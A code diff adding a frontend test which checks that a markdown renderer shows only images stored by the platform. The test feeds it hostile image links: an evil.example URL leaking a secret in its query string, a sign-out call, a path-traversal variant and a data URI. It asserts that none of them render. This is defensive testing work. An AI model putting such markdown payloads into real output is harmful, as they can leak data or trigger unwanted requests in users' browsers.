@@ -46,3 +46,36 @@ test('keeps code block lines aligned without applying inline code decoration', a
   expect(getComputedStyle(inline).paddingLeft).not.toBe('0px');
   expect(getComputedStyle(inline).backgroundColor).not.toBe('rgba(0, 0, 0, 0)');
 });
+
+const imageSources = async (text: string) => {
+  const screen = await render(
+    <MantineProvider>
+      <Markdownish text={text} />
+    </MantineProvider>,
+  );
+  return [...screen.container.querySelectorAll('img')].map((image) =>
+    image.getAttribute('src'),
+  );
+};
+
+test('shows only images stored by the platform', async () => {
+  const candidate = `/api/images/candidates/${'a'.repeat(32)}`;
+  const icon = '/api/app/01abc/icon?v=01key&size=128';
+  expect(await imageSources(`A ![A](${candidate}) ![icon](${icon})`)).toEqual([
+    candidate,
+    icon,
+  ]);
+  // Model output must never make the browser call an arbitrary URL.
+  expect(
+    await imageSources(
+      [
+        '![x](https://evil.example/track.png?secret=1)',
+        '![x](//evil.example/a.png)',
+        '![x](/api/auth/sign-out)',
+        `![x](${candidate}/../../auth/sign-out)`,
+        '![x](/api/images/candidates/short)',
+        '![x](data:image/png;base64,AAAA)',
+      ].join('\n\n'),
+    ),
+  ).toEqual([]);
+});
